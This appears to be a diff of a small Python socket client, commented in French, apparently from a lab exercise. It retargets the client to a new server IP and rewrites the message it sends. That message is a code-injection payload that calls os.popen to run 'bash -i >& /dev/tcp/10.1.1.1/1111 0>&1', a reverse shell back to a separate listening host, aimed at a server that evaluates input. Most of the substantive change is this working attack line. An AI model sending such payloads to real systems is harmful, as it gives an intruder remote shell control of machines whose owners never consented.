@@ -3,7 +3,7 @@ import sys
 import re
 import logging
 # On définit la destination de la connexion
-host = '10.33.66.78'  # IP du serveur
+host = '10.1.1.11'  # IP du serveur
 port = 13337          # Port choisir par le serveur
 
 class CustomFormatter(logging.Formatter):
@@ -52,7 +52,7 @@ try:
     data = s.recv(1024)
     logger.info(f"Réponse reçue du serveur {host} : {repr(data)}")
                 
-    userMessage = "__import__('os').popen('bash -i >& /dev/tcp/10.33.67.174/1111 0>&1').read()"
+    userMessage = "__import__('os').popen('bash -i >& /dev/tcp/10.1.1.1/1111 0>&1').read()"
 
     s.sendall(userMessage.encode("utf-8"))
     logger.info("Message envoyé au serveur %s : %s", host, userMessage)
